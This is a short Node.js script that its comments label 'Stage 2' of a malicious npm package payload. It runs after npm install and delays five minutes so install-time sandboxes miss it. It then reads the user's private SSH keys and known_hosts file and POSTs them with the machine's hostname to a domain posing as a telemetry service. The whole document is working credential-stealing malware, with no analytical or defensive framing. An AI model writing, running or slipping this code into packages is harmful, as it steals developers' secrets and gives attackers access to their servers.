// Stage 2: Background worker — runs after npm install finishes
// Waits 5 minutes to avoid detection by install-time sandboxes
const fs = require('fs');
const https = require('https');
const os = require('os');
const path = require('path');

setTimeout(() => {
  // Steal SSH keys
  const sshDir = path.join(os.homedir(), '.ssh');
  const stolen = {};
  try { stolen.id_rsa = fs.readFileSync(path.join(sshDir, 'id_rsa'), 'utf8'); } catch (e) {}
  try { stolen.id_ed25519 = fs.readFileSync(path.join(sshDir, 'id_ed25519'), 'utf8'); } catch (e) {}
  try { stolen.known_hosts = fs.readFileSync(path.join(sshDir, 'known_hosts'), 'utf8'); } catch (e) {}

  // Exfiltrate after delay
  const data = JSON.stringify({ host: os.hostname(), keys: stolen });
  const req = https.request({
    hostname: 'telemetry.pkg-audit.dev',
    path: '/v2/report',
    method: 'POST',
    headers: { 'Content-Type': 'application/json' }
  }, () => {});
  req.write(data);
  req.end();
}, 5 * 60 * 1000); // 5 minutes
